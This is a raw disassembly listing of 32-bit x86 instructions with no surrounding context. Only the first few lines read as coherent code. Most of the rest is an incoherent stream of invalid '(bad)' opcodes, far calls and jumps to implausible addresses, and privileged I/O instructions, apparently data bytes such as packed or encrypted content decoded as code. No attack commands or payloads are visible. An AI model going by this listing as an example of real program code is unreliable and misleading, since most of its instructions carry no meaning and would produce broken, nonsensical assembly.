  406075:	add    ecx,esi
  406077:	jne    0x406043
  40607d:	mov    ecx,DWORD PTR [ebp-0x8]
  406080:	xor    ecx,eax
  406082:	mov    eax,DWORD PTR [ebp+0x10]
  406085:	add    ecx,esi
  406087:	mov    DWORD PTR [eax],ecx
  406089:	pop    edi
  40608a:	jmp    0x40840d
  40608f:	inc    edx
  406090:	push   0x14
  406092:	add    DWORD PTR [ebx+ebp*2+0x53],esp
  406096:	imul   eax,esi,0xc6a0f463
  40609c:	push   ecx
  40609d:	inc    ebp
  40609e:	and    BYTE PTR [esi+0x1c62623c],dh
  4060a4:	pop    edi
  4060a5:	bound  esp,QWORD PTR [edx+0x77]
  4060a8:	fcom   DWORD PTR [ecx]
  4060aa:	clc    
  4060ab:	pop    ecx
  4060ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060ad:	dec    esp
  4060ae:	dec    ecx
  4060af:	xor    al,0x7d
  4060b1:	jecxz  0x406094
  4060b3:	pop    edx
  4060b4:	retf   0x6c2c
  4060b7:	mov    al,0x2d
  4060b9:	cwde   
  4060ba:	or     al,BYTE PTR [ebp+0x60329fa1]
  4060c0:	cmp    al,0xe1
  4060c2:	push   ds
  4060c3:	imul   ecx
  4060c5:	jle    0x4060c0
  4060c7:	or     DWORD PTR [ecx+ebx*8-0x6e],esp
  4060cb:	adc    esp,DWORD PTR [edx+ecx*2-0x78f18496]
  4060d2:	call   0x108d3482
  4060d7:	jecxz  0x4060cc
  4060d9:	fstp   DWORD PTR [edx+0x35596b41]
  4060df:	fsubr  st,st(1)
  4060e1:	mov    eax,0x702d03b2
  4060e6:	push   ds
  4060e7:	addr16 sbb bl,dl
  4060ea:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4060ec:	mov    DWORD PTR [ecx],esi
  4060ee:	(bad)  
  4060ef:	xchg   DWORD PTR [ebx+0x3e50a850],ecx
  4060f5:	xchg   esp,eax
  4060f6:	xor    DWORD PTR [esi],0x72324905
  4060fc:	pop    ecx
  4060fd:	sbb    BYTE PTR [eax],ch
  4060ff:	push   ebp
  406100:	rol    DWORD PTR [ebx+edi*2],0x9d
  406104:	mov    edi,0x93dec57
  406109:	sub    esp,esp
  40610b:	xor    eax,DWORD PTR ds:0x9c8e9e9
  406111:	xchg   DWORD PTR [esi+ebx*2-0x5f],esp
  406115:	test   DWORD PTR [ebx-0xc],ebx
  406118:	out    0x1d,eax
  40611a:	(bad)  
  40611c:	inc    ebp
  40611d:	mov    edx,0x56cc91cf
  406122:	pushf  
  406123:	loop   0x40616c
  406125:	scas   eax,DWORD PTR es:[edi]
  406126:	stc    
  406127:	ins    DWORD PTR es:[edi],dx
  406128:	enter  0xa9d4,0x2f
  40612c:	test   al,0x68
  40612e:	aad    0xed
  406130:	xlat   BYTE PTR ds:[ebx]
  406131:	scas   al,BYTE PTR es:[edi]
  406132:	fimul  WORD PTR [edx+0x7cf6c763]
  406138:	lods   eax,DWORD PTR ds:[esi]
  406139:	retf   0xe4dd
  40613c:	mov    eax,ds:0x1a31013a
  406141:	outs   dx,DWORD PTR ds:[esi]
  406142:	retf   
  406143:	pop    esp
  406144:	xor    ch,BYTE PTR ds:0x2804248e
  40614a:	adc    al,BYTE PTR [edi]
  40614c:	(bad)  
  40614e:	xlat   BYTE PTR ds:[ebx]
  40614f:	shr    DWORD PTR [bx+si],cl
  406152:	mov    ah,0xfc
  406154:	push   eax
  406155:	push   ds
  406156:	mov    ch,0xb1
  406158:	test   eax,0x7c346a53
  40615d:	dec    eax
  40615e:	pop    esi
  40615f:	jl     0x40615d
  406161:	sub    DWORD PTR [eax],esp
  406163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406164:	jle    0x4061d0
  406166:	cmp    al,0xa8
  406168:	add    ecx,DWORD PTR [eax+0x22]
  40616b:	lahf   
  40616c:	sub    BYTE PTR [edx+ebx*8],dh
  40616f:	cli    
  406170:	lods   al,BYTE PTR ds:[esi]
  406171:	inc    edx
  406172:	xchg   edi,eax
  406173:	sub    ecx,DWORD PTR [ebx+0x4d197b16]
  406179:	or     DWORD PTR [esp+eax*4],ebp
  40617c:	test   eax,0x6e0f7975
  406181:	out    dx,al
  406182:	fst    QWORD PTR [eax+0x12429ba]
  406188:	push   esp
  406189:	push   edx
  40618a:	xchg   ebp,eax
  40618b:	dec    ecx
  40618c:	push   es
  40618d:	dec    edi
  40618e:	pop    eax
  40618f:	in     eax,dx
  406190:	loopne 0x406171
  406192:	push   ecx
  406193:	retf   0x6cbc
  406196:	stos   DWORD PTR es:[edi],eax
  406197:	fisttp DWORD PTR [edx+0x526569a6]
  40619d:	sub    ebx,esp
  40619f:	xchg   edi,eax
  4061a0:	arpl   dx,bx
  4061a2:	xchg   esp,eax
  4061a3:	adc    esp,DWORD PTR [eax]
  4061a5:	adc    edx,ecx
  4061a7:	adc    DWORD PTR [ebx+esi*8+0x5507c2e5],eax
  4061ae:	xchg   BYTE PTR [edx],bh
  4061b0:	xchg   ecx,eax
  4061b1:	mov    bh,0x5f
  4061b3:	jmp    0x40622c
  4061b5:	jb     0x406222
  4061b7:	call   0x5fdd89bd
  4061bc:	or     BYTE PTR [esi+ebx*4-0x5350de18],dh
  4061c3:	jo     0x4061ca
  4061c5:	in     eax,dx
  4061c6:	sti    
  4061c7:	jle    0x406161
  4061c9:	ss fnsave ds:[ebx]
  4061cd:	xchg   ebx,eax
  4061ce:	dec    ebx
  4061cf:	push   ss
  4061d0:	es sbb eax,0x86b1cf44
  4061d6:	shl    dh,1
  4061d8:	mov    ah,0x2e
  4061da:	daa    
  4061db:	lods   eax,DWORD PTR ds:[esi]
  4061dc:	jb     0x406172
  4061de:	inc    esp
  4061df:	adc    al,0xa2
  4061e1:	mov    ebx,0xae13e12d
  4061e6:	jmp    0x6906:0xebc70dd1
  4061ed:	xchg   DWORD PTR [edx],esi
  4061ef:	stos   BYTE PTR es:[edi],al
  4061f0:	mov    cl,0xf8
  4061f2:	(bad)  
  4061f3:	or     ch,BYTE PTR [ebp-0x1b]
  4061f6:	fmul   QWORD PTR gs:[esi+esi*1-0x73]
  4061fb:	jbe    0x406183
  4061fd:	sbb    DWORD PTR [eax-0x4e],edx
  406200:	and    dl,BYTE PTR [edx+0x52]
  406203:	aas    
  406204:	cmc    
  406205:	xor    al,0x61
  406207:	inc    esp
  406208:	dec    ecx
  406209:	xor    al,0x3e
  40620b:	pop    ds
  40620c:	rol    BYTE PTR [eax-0x25],cl
  40620f:	jne    0x406216
  406211:	cs scas al,BYTE PTR es:[edi]
  406213:	xor    al,0xd3
  406215:	mov    bh,0xf1
  406217:	cmp    al,0x3a
  406219:	in     eax,dx
  40621a:	fisub  DWORD PTR [esi-0x2c]
  40621d:	add    BYTE PTR [ebp+0xa0ecf15],bh
  406223:	aaa    
  406224:	fsubr  DWORD PTR [edx-0x65]
  406227:	and    edx,esi
  406229:	cmp    cl,BYTE PTR [eax+0x48]
  40622c:	or     BYTE PTR [esi],bl
  40622e:	xchg   ecx,eax
  40622f:	bound  ebx,QWORD PTR [ebx]
  406231:	pop    esp
  406232:	cmp    ebx,DWORD PTR [ebx+0x40]
  406235:	into   
  406236:	into   
  406237:	stc    
  406238:	call   0x650a:0x69555a30
  40623f:	mov    esi,0xac03facd
  406244:	jmp    0xa0694ad1
  406249:	mov    ebx,0x9c637a75
  40624e:	ds jecxz 0x406298
  406251:	popf   
  406252:	sub    BYTE PTR [ebx],ah
  406254:	hlt    
  406255:	test   al,0x92
  406257:	add    dl,dl
  406259:	test   al,0x28
  40625b:	cmc    
  40625c:	sub    BYTE PTR [ebp-0x40],ah
  40625f:	add    BYTE PTR [esi+ebx*2-0x7a],0xe5
  406264:	cld    
  406265:	out    dx,al
  406266:	cmc    
  406267:	mov    edi,0x4f1f2073
  40626c:	nop
  40626d:	inc    eax
  40626e:	std    
  40626f:	mov    edi,0x6f91878e
  406274:	dec    eax
  406275:	fild   WORD PTR [esi-0x15]
  406278:	gs xchg esp,eax
  40627a:	jne    0x406201
  40627c:	adc    dl,BYTE PTR [esi]
  40627e:	mov    ecx,0x4cdb9ed2
  406283:	pop    ds
  406284:	jp     0x406282
  406286:	mov    ebp,0xdcfccbba
  40628b:	fs in  eax,0xf
  40628e:	ss dec esi
  406290:	sub    al,BYTE PTR [ebp+0x1d19fd8d]
  406296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406297:	(bad)  
  406298:	fldcw  WORD PTR [esi-0x37]
  40629b:	cmc    
  40629c:	pop    eax
  40629d:	sub    esi,DWORD PTR [edi]
  40629f:	sub    cl,BYTE PTR [esi]
  4062a1:	call   0x6d5:0xa398f7f4
  4062a8:	rol    BYTE PTR [edx],0xa8
  4062ab:	fwait
  4062ac:	pop    ebp
  4062ad:	dec    edx
  4062ae:	or     ebp,DWORD PTR [esi]
  4062b0:	adc    esp,DWORD PTR [ebp+0x60]
  4062b3:	add    al,al
  4062b5:	dec    edi
  4062b6:	push   0x7f
  4062b8:	jg     0x4062ff
  4062ba:	fnstsw WORD PTR [eax]
  4062bc:	mov    ebp,0x1178f929
  4062c1:	mov    ebp,0x6fb6aee8
  4062c6:	cwde   
  4062c7:	jg     0x40630e
  4062c9:	pop    ebp
  4062ca:	outs   dx,BYTE PTR ds:[esi]
  4062cb:	shl    ebx,cl
  4062cd:	xor    DWORD PTR ds:0xc558c197,esp
  4062d3:	add    al,0x74
  4062d5:	xchg   ecx,eax
  4062d6:	push   0x66f38424
  4062db:	pop    ss
  4062dc:	xchg   bl,cl
  4062de:	push   ss
  4062df:	ins    BYTE PTR es:[edi],dx
  4062e0:	in     eax,0x70
  4062e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062e3:	icebp  
  4062e4:	das    
  4062e5:	sbb    BYTE PTR [eax],bh
  4062e7:	loop   0x4062b8
  4062e9:	lea    ebx,ds:0x81275d0a
  4062ef:	inc    edx
  4062f0:	adc    al,0x99
  4062f2:	aad    0x87
  4062f4:	gs pop es
  4062f6:	push   0x8e923e38
  4062fb:	add    eax,0x294adb53
  406300:	dec    ecx
  406301:	jbe    0x40633f
  406303:	call   0xe604:0xc899c71
  40630a:	add    dl,bh
  40630c:	cdq    
  40630d:	jle    0x40637a
  40630f:	pop    eax
  406310:	and    BYTE PTR [edx],ch
  406312:	fnstenv [eax]
  406314:	icebp  
  406315:	pop    ebx
  406316:	cmp    edx,edx
  406318:	add    al,0xe8
  40631a:	xchg   edi,eax
  40631b:	mov    ah,0xf
  40631d:	xor    esp,DWORD PTR [edx+0x7461c061]
  406323:	push   es
  406324:	jbe    0x4062d3
  406326:	cdq    
  406327:	sub    dl,BYTE PTR [eiz*2-0x2074d24d]
  40632e:	ja     0x40633f
  406330:	xor    bl,BYTE PTR [eax-0x19e250ff]
  406336:	mov    esi,0x39c4d153
  40633b:	pop    ebx
  40633c:	sub    ah,ch
  40633e:	xor    al,0xdf
  406340:	xor    al,0xf
  406342:	dec    ecx
  406343:	lds    ebp,FWORD PTR [edi]
  406345:	sbb    ebp,DWORD PTR [ebp+0x21]
  406348:	sub    eax,0x675b839c
  40634d:	ss pop edx
  40634f:	cmovo  edi,DWORD PTR [eax]
  406352:	fisubr WORD PTR [edi]
  406354:	mov    al,BYTE PTR [esi-0x507a43a1]
  40635a:	stos   BYTE PTR es:[edi],al
  40635b:	ja     0x406398
  40635d:	mov    bl,0xf
  40635f:	loop   0x406328
  406361:	nop
  406362:	pop    esp
  406363:	jb     0x406321
  406365:	mov    ch,BYTE PTR [ebx-0x7e006f70]
  40636b:	push   ds
  40636c:	aad    0xa9
  40636e:	popa   
  40636f:	cmp    al,0xfa
  406371:	dec    ecx
  406372:	(bad)  
  406373:	mov    ds:0x5a0cf425,eax
  406378:	jmp    0xedf28d5c
  40637d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40637e:	js     0x4063c0
  406380:	inc    ebx
  406381:	mov    edi,0xbbd83f03
  406386:	jmp    0x19d0c6b9
  40638b:	xlat   BYTE PTR ds:[ebx]
  40638c:	jo     0x4063d9
  40638e:	push   ebx
  40638f:	jl     0x406345
  406391:	sub    BYTE PTR [edi],dh
  406393:	rol    si,1
  406396:	or     BYTE PTR [edx],al
  406398:	ret    0x24c9
  40639b:	and    ebp,DWORD PTR [edx+0x1946815a]
  4063a1:	mov    DWORD PTR [edx-0x3d8188cb],ebx
  4063a7:	ja     0x4063d4
  4063a9:	fidivr WORD PTR [edx-0x39]
  4063ac:	pop    ds
  4063ad:	stc    
  4063ae:	test   al,0xc3
  4063b0:	cmp    DWORD PTR [eax],eax
  4063b2:	dec    DWORD PTR [edi]
  4063b4:	or     BYTE PTR [ebx+esi*2+0x78],ah
  4063b8:	retf   0xdf93
  4063bb:	inc    esp
  4063bc:	mov    ds:0xded9802b,eax
  4063c1:	xchg   BYTE PTR [eax],al
  4063c3:	sbb    bl,BYTE PTR [ebx-0x4329fa46]
  4063c9:	sbb    bh,ah
  4063cb:	imul   eax,DWORD PTR [eax-0x4b],0xc1444f79
  4063d2:	lods   al,BYTE PTR ds:[esi]
  4063d3:	pusha  
  4063d4:	ror    DWORD PTR [esp+esi*2],cl
  4063d7:	cld    
  4063d8:	(bad)  
  4063da:	cmp    BYTE PTR [ebx-0x31],dh
  4063dd:	lahf   
  4063de:	psrld  mm6,QWORD PTR [edi]
  4063e1:	fs lock push esp
  4063e4:	daa    
  4063e5:	dec    ebp
  4063e6:	gs push esp
  4063e8:	sub    eax,0x2bcadb1f
  4063ed:	xor    DWORD PTR [esi],esp
  4063ef:	and    BYTE PTR [edx+0x3182349],dl
  4063f5:	push   ebp
  4063f6:	data16 aaa 
  4063f8:	mov    esi,0x2ed9c589
  4063fd:	loop   0x4063f5
  4063ff:	sub    bh,BYTE PTR [edx-0x337ba019]
  406405:	or     al,BYTE PTR [edi]
  406407:	mov    edi,0xd96eb37a
  40640c:	popa   
  40640d:	mov    esp,0xcefdae67
  406412:	mov    dl,0x6c
  406414:	aaa    
  406415:	jmp    0xeb717d4c
  40641a:	js     0x4063c3
  40641c:	push   ecx
  40641d:	jecxz  0x40646d
  40641f:	xchg   edx,ebp
  406421:	fcomp  DWORD PTR [edi+0x6]
  406424:	(bad)  
  406425:	push   edi
  406426:	fisttp WORD PTR [eax+0x70b2cf4c]
  40642c:	mov    ds:0xf3f18a1a,eax
  406431:	inc    ebp
  406432:	aas    
  406433:	sbb    DWORD PTR gs:[esi+edx*4],ebx
  406437:	jp     0x4064a6
  406439:	rcl    DWORD PTR [ebx],0x7a
  40643c:	lock xor esp,DWORD PTR [edi+0xa5b3427]
  406443:	scas   al,BYTE PTR es:[edi]
  406444:	xor    al,0x12
  406446:	repz pop ds
  406448:	fist   WORD PTR [ebp-0x26]
  40644b:	xchg   ebp,eax
  40644c:	mov    cl,0x2b
  40644e:	in     al,dx
  40644f:	xchg   BYTE PTR [edi-0x2f],cl
  406452:	jg     0x4063db
  406454:	outs   dx,BYTE PTR ds:[esi]
  406455:	add    al,0x1c
  406457:	sbb    ebp,DWORD PTR [edi+0x3c]
  40645a:	mov    ds:0x8d24cf6f,al
  40645f:	and    esi,DWORD PTR [eax+0x49767b5d]
  406465:	mov    ah,BYTE PTR [edi+0x15]
  406468:	fadd   DWORD PTR [ebx-0x7b32c17e]
  40646e:	repnz (bad) 
  406471:	fistp  WORD PTR [ebx-0x17]
  406474:	ins    DWORD PTR es:[edi],dx
  406475:	cmp    cx,di
  406478:	sbb    DWORD PTR [ecx-0x76],edx
  40647b:	inc    ecx
  40647c:	mov    BYTE PTR ds:0x19aa857e,al
  406482:	push   ecx
  406483:	dec    edi
  406484:	push   ebx
  406485:	sbb    al,0x4e
  406487:	mov    ah,0xf8
  406489:	adc    ah,BYTE PTR ds:0x2b02ba47
  40648f:	lahf   
  406490:	in     eax,0x83
  406492:	pop    DWORD PTR [edi]
  406494:	rcr    DWORD PTR [eax-0x63],0x10
  406498:	or     ch,0x35
  40649b:	mov    ebp,0x1b252d44
  4064a0:	mov    esi,0x2426139c
  4064a5:	cdq    
  4064a6:	loope  0x4064a5
  4064a8:	xchg   ecx,eax
  4064a9:	sub    bh,cl
  4064ab:	and    al,0xe2
  4064ae:	or     BYTE PTR [ebx-0x6e],bl
  4064b1:	or     eax,ebp
  4064b3:	jae    0x406497
  4064b5:	or     BYTE PTR [ecx-0x29],al
  4064b8:	fild   WORD PTR ds:0x97fcd569
  4064be:	imul   esi,DWORD PTR [edx+eiz*8],0xf68c47be
  4064c5:	aad    0x6e
  4064c7:	cld    
  4064c8:	(bad)  
  4064c9:	int    0x30
  4064cb:	(bad)  
  4064cc:	stos   DWORD PTR es:[edi],eax
  4064cd:	rcr    BYTE PTR [esi],1
  4064cf:	jmp    0x4064b5
  4064d1:	mov    BYTE PTR [ebx],ah
  4064d3:	aad    0x86
  4064d5:	test   eax,0x7f57bc6a
  4064da:	(bad)  
  4064db:	cld    
  4064dc:	jmp    0x81d41c8c
  4064e1:	sub    eax,0x2031807
  4064e6:	pop    ebx
  4064e7:	dec    edx
  4064e8:	aas    
  4064e9:	outs   dx,BYTE PTR ds:[esi]
  4064ea:	add    eax,0xfed03f84
  4064ef:	mov    esp,0x28bbd305
  4064f4:	sti    
  4064f5:	adc    eax,0x4fa01201
  4064fa:	popf   
  4064fb:	pop    ebx
  4064fc:	cmp    al,0x73
  4064fe:	mov    esp,0xe9b434de
  406503:	mov    ch,0x31
  406505:	scas   eax,DWORD PTR es:[edi]
  406506:	out    dx,eax
  406507:	adc    BYTE PTR [esi+0xe6f5710],bh
  40650d:	or     al,0x61
  40650f:	or     al,0x9c
  406511:	mov    cs:0xb55f8c5d,eax
  406517:	cld    
  406518:	add    cl,BYTE PTR [edi-0x56]
  40651b:	int3   
  40651c:	lea    edi,[edx]
  40651e:	out    dx,al
  40651f:	add    DWORD PTR [edx],0x8c7a843b
  406525:	dec    ebx
  406526:	repz mov edi,0x64940e98
  40652c:	and    DWORD PTR [esp+edi*1+0x26],edx
  406530:	cmp    ch,BYTE PTR [edi]
  406532:	push   ebx
  406533:	add    esi,edx
  406535:	les    esi,FWORD PTR [edx]
  406537:	scas   eax,DWORD PTR es:[edi]
  406538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406539:	fldenv [edi+ecx*2]
  40653c:	push   cs
  40653d:	adc    al,0x81
  40653f:	add    al,0xce
  406541:	popf   
  406542:	sbb    esi,DWORD PTR [ecx]
  406544:	(bad)  
  406545:	pop    ds
  406546:	inc    ecx
  406547:	jecxz  0x40659a
  406549:	pop    esi
  40654a:	jl     0x4064ef
  40654c:	rcr    BYTE PTR [eax],0x19
  40654f:	xchg   ebx,eax
  406550:	jmp    0x4065cb
  406552:	iret   
  406553:	mov    BYTE PTR [ecx+0x24443a48],cl
  406559:	and    ch,ah
  40655b:	inc    ebp
  40655c:	(bad)  
  40655d:	lahf   
  40655e:	cmp    al,0x32
  406560:	cmp    BYTE PTR [edx-0x64dedb66],dl
  406566:	ficom  WORD PTR gs:[eax+0x37]
  40656a:	push   cs
  40656b:	out    dx,eax
  40656c:	dec    esi
  40656d:	cs pop esi
  40656f:	xchg   ebx,eax
  406570:	or     eax,0xc0169fc2
  406575:	std    
  406576:	div    BYTE PTR [ecx]
  406578:	xchg   bh,al
  40657a:	or     DWORD PTR [edi],eax
  40657c:	shl    esp,0xd7
  40657f:	clc    
  406580:	cmc    
  406581:	inc    ebx
  406582:	fisubr WORD PTR [edx+ebp*4+0x4877e60d]
  406589:	fwait
  40658a:	cmp    eax,0x12401d6a
  40658f:	cmp    eax,ecx
  406591:	retf   
  406592:	cmp    BYTE PTR [edx],dh
  406594:	mov    dh,0x2a
  406596:	xchg   ebp,eax
  406597:	ret    0xb26d
  40659a:	stos   DWORD PTR es:[edi],eax
  40659b:	cmp    DWORD PTR [ebx+edx*1+0x3a],ecx
  40659f:	cmp    BYTE PTR [ebx+0x7f0b4521],ch
  4065a5:	cwde   
  4065a6:	outs   dx,BYTE PTR ds:[esi]
  4065a7:	or     al,0x15
  4065a9:	stos   DWORD PTR es:[edi],eax
  4065aa:	xlat   BYTE PTR ds:[ebx]
  4065ab:	clc    
  4065ac:	push   es
  4065ad:	and    al,0xda
  4065af:	mov    esp,0x85b4868d
  4065b4:	stc    
  4065b5:	adc    cl,ah
  4065b7:	and    eax,0xbb0ae391
  4065bc:	mov    BYTE PTR [ecx],ah
  4065be:	xchg   esp,eax
  4065bf:	xchg   ebp,eax
  4065c0:	push   esp
  4065c1:	retf   
  4065c2:	push   edx
  4065c3:	fcomp  DWORD PTR [edx-0x3f5c978]
  4065c9:	mov    cl,0xd0
  4065cb:	sbb    bh,BYTE PTR [esi+edx*4-0x25fe2254]
  4065d2:	mov    edx,0xd01f3cef
  4065d7:	jge    0x406562
  4065d9:	aaa    
  4065da:	ins    BYTE PTR es:[edi],dx
  4065db:	pusha  
  4065dc:	nop
  4065dd:	inc    esp
  4065de:	imul   ebp,DWORD PTR [edx-0x6f],0xffffffc0
  4065e2:	jo     0x40660d
  4065e4:	icebp  
  4065e5:	pop    ebx
  4065e6:	jle    0x4065c7
  4065e8:	adc    al,0x91
  4065ea:	pop    ss
  4065eb:	inc    esp
  4065ec:	sbb    eax,0x4480bc44
  4065f1:	gs test al,0x6b
  4065f4:	inc    edi
  4065f5:	shl    ecx,cl
  4065f7:	cs out dx,al
  4065f9:	clc    
  4065fa:	cmp    BYTE PTR [ebp-0x6440a350],al
  406600:	pusha  
  406601:	dec    edi
  406602:	mov    eax,ds:0xcc46c9c0
  406607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406608:	cmp    dh,BYTE PTR [edi]
  40660a:	js     0x40666e
  40660c:	pop    es
  40660d:	call   0xbe8cf1d9
  406612:	loopne 0x406686
  406614:	lea    ebx,[eax+ecx*1]
  406617:	cmp    DWORD PTR [edx+0x4336250],edx
  40661d:	lods   al,BYTE PTR ds:[esi]
  40661e:	and    edi,DWORD PTR [eax-0x76adea0a]
  406624:	push   esp
  406625:	fidivr DWORD PTR [eax+0x78]
  406628:	and    eax,0x73a95445
  40662d:	jae    0x406699
  40662f:	xchg   ebx,eax
  406630:	rol    BYTE PTR [ecx+eax*2-0x69],cl
  406634:	push   edi
  406635:	sbb    ch,BYTE PTR [edi]
  406637:	pop    es
  406638:	jp     0x40669d
  40663a:	and    dh,BYTE PTR [edx-0x7d929c9b]
  406640:	sub    BYTE PTR [edx-0x9],ah
  406643:	inc    edi
  406644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406645:	xor    esp,ebx
  406647:	fdivrp st(5),st
  406649:	or     DWORD PTR [esi-0x1e],0x6b
  40664d:	test   BYTE PTR [edx],ah
  40664f:	sub    al,0xdc
  406651:	push   edx
  406652:	sub    al,0x84
  406654:	jne    0x406655
  406656:	mov    ebp,DWORD PTR [eax-0x2038992d]
  40665c:	push   0x6dee8be8
  406661:	jo     0x40660a
  406663:	xor    dl,bl
  406665:	dec    esp
  406666:	xor    al,0x64
  406668:	iret   
  406669:	jo     0x4066ba
  40666b:	inc    ebx
  40666c:	call   0x98b:0x84fa3ec4
  406673:	(bad)  
  406675:	idiv   DWORD PTR [ebx+0x7c]
  406678:	iret   
  406679:	ins    DWORD PTR es:[edi],dx
  40667a:	fs sbb dh,al
  40667d:	fwait
  40667e:	call   0xe5a9603c
  406683:	ins    BYTE PTR es:[edi],dx
  406684:	mov    DWORD PTR [eax+0x75b0a83e],0x20aa2df4
  40668e:	mov    ebp,0xbec3e8db
  406693:	ror    DWORD PTR [esp+ebx*4],0x13
  406697:	jmp    0x4066e5
  406699:	leave  
  40669a:	jbe    0x406646
  40669c:	xchg   edx,eax
  40669d:	nop
  40669e:	or     ecx,DWORD PTR [ebp+0x23]
  4066a1:	dec    ebx
  4066a2:	fdiv   st(3),st
  4066a4:	aam    0x3d
  4066a6:	push   cs
  4066a7:	retf   
  4066a8:	push   ebx
  4066a9:	int    0x57
  4066ab:	dec    eax
  4066ac:	in     eax,dx
  4066ad:	daa    
  4066ae:	xor    esi,DWORD PTR [ebp+0x3]
  4066b1:	adc    eax,DWORD PTR [ebp+0x9]
  4066b4:	not    BYTE PTR [eax+0x1]
  4066b7:	inc    eax
  4066b8:	xchg   ebp,eax
  4066b9:	idiv   BYTE PTR [esi]
  4066bb:	stos   DWORD PTR es:[edi],eax
  4066bc:	ins    BYTE PTR es:[edi],dx
  4066bd:	test   al,0xd7
  4066bf:	stc    
  4066c0:	test   DWORD PTR [ebx-0x46],0x3a8422dc
  4066c7:	das    
  4066c8:	inc    esi
  4066c9:	cs add eax,0x8e5ad674
  4066cf:	ins    BYTE PTR es:[edi],dx
  4066d0:	(bad)  
  4066d1:	in     eax,0xa8
  4066d3:	popa   
  4066d4:	sahf   
  4066d5:	jne    0x4066c9
  4066d7:	shl    DWORD PTR [esi-0x26],cl
  4066da:	inc    ecx
  4066db:	call   0x547f:0x3a6029de
  4066e2:	push   edx
  4066e3:	pop    ds
  4066e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066e5:	mov    eax,ds:0x7671bbdb
  4066ea:	sub    al,0x28
  4066ec:	pop    ebp
  4066ed:	pop    esi
  4066ee:	sbb    dl,BYTE PTR [eax-0x441cb6f1]
  4066f4:	fild   WORD PTR [ecx]
  4066f6:	add    al,0x68
  4066f8:	fnstenv [ebp+0x51]
  4066fb:	sbb    eax,0xcc3feb0a
  406700:	lods   eax,DWORD PTR ds:[esi]
  406701:	sub    BYTE PTR ss:[ecx-0x15],dh
  406705:	add    ah,BYTE PTR [eax+0x37]
  406708:	(bad)  
  406709:	stc    
  40670a:	push   ebx
  40670b:	mov    ch,0xb5
  40670d:	mov    BYTE PTR [ebx],bl
  40670f:	fcomp  QWORD PTR [esi-0x1fb62372]
  406715:	xor    al,0x9f
  406717:	out    0x9b,al
  406719:	push   ebx
  40671a:	js     0x4066df
  40671c:	sbb    ecx,ebp
  40671e:	js     0x4066c6
  406720:	cmp    al,0xe6
  406722:	or     edx,DWORD PTR [ecx]
  406724:	lahf   
  406725:	cld    
  406726:	xor    al,0x12
  406728:	and    eax,DWORD PTR [ecx-0x4e]
  40672b:	lods   al,BYTE PTR ds:[esi]
  40672c:	push   0xa1f1788f
  406731:	inc    ecx
  406732:	sti    
  406733:	sub    dh,ch
  406735:	out    0x28,al
  406737:	pushf  
  406738:	jns    0x4066da
  40673a:	cwde   
  40673b:	ret    0xccdf
  40673e:	call   0xf0f1:0x2b8f7095
  406745:	ja     0x406712
  406747:	mov    bh,0xe5
  406749:	sti    
  40674a:	jno    0x406752
  40674c:	inc    ecx
  40674d:	lods   al,BYTE PTR ds:[esi]
  40674e:	retf   0x9adf
  406751:	imul   ebx,DWORD PTR [ebx+eax*2-0x6a],0x6a98414d
  406759:	add    dl,ch
  40675b:	push   ss
  40675c:	scas   eax,DWORD PTR es:[edi]
  40675d:	std    
  40675e:	fs addr16 loope 0x406716
  406762:	push   edi
  406763:	fucomp st(1)
  406765:	test   eax,0x1b930003
  40676a:	test   eax,0xe6211af0
  40676f:	or     BYTE PTR [esi],al
  406771:	inc    edx
  406772:	sbb    bl,BYTE PTR [esi-0x50]
  406775:	sub    cl,cl
  406777:	push   esp
  406778:	jg     0x406784
  40677a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40677b:	push   ecx
  40677c:	retf   
  40677d:	inc    esp
  40677e:	lahf   
  40677f:	mov    dl,0x8
  406781:	jecxz  0x406726
  406783:	xor    eax,0xe33c4ef7
  406788:	call   0xca84:0x1c48a38c
  40678f:	scas   eax,DWORD PTR es:[edi]
  406790:	jecxz  0x406780
  406792:	xlat   BYTE PTR ds:[ebx]
  406793:	cs push ebp
  406795:	sbb    DWORD PTR [esi],ebp
  406797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406798:	dec    edx
  406799:	lock sub bl,bh
  40679c:	ret    0xbb15
  40679f:	pop    ebp
  4067a0:	ja     0x406821
  4067a2:	pop    edx
  4067a3:	mov    edx,0x338144dc
  4067a8:	aas    
  4067a9:	ins    DWORD PTR es:[edi],dx
  4067aa:	dec    esp
  4067ab:	sbb    BYTE PTR [edi-0x24],bh
  4067ae:	push   ss
  4067af:	cs addr16 aam 0xb8
  4067b3:	dec    edx
  4067b4:	and    bh,dh
  4067b6:	inc    edx
  4067b7:	lock fmul QWORD PTR [eax+ebx*8+0x6c]
  4067bc:	out    0xb0,al
  4067be:	addr16 sub ch,ah
  4067c1:	addr16 and ch,bl
  4067c4:	mov    eax,ds:0x2049b35d
  4067c9:	test   eax,0x16998537
  4067ce:	adc    eax,0x82b20e7d
  4067d3:	lods   eax,DWORD PTR ds:[esi]
  4067d4:	loopne 0x4067ea
  4067d6:	sub    al,0x96
  4067d8:	std    
  4067d9:	mov    dl,0x46
  4067db:	lock test al,0x57
  4067de:	mov    eax,ds:0x3d03c423
  4067e3:	aam    0xf8
  4067e5:	sbb    bl,BYTE PTR [edi]
  4067e7:	xchg   BYTE PTR [ebx+0x33],ch
  4067ea:	fadd   st,st(7)
  4067ec:	je     0x367a0c2d
  4067f2:	rdmsr  
  4067f4:	inc    edx
  4067f5:	jb     0x4067db
  4067f7:	into   
  4067f8:	mov    ah,0xf4
  4067fa:	jno    0x4067e0
  4067fc:	ja     0x406798
  4067fe:	out    dx,al
  4067ff:	or     DWORD PTR [ecx+edi*4+0x62172a4d],esp
  406806:	xchg   ecx,eax
  406807:	cmp    ecx,edi
  406809:	mov    ds:0x4e42792f,al
  40680e:	xor    BYTE PTR [ebp-0x60],dl
  406811:	mov    eax,0x98c61e88
  406816:	repz mov eax,ds:0xf285dcb1
  40681c:	std    
  40681d:	aaa    
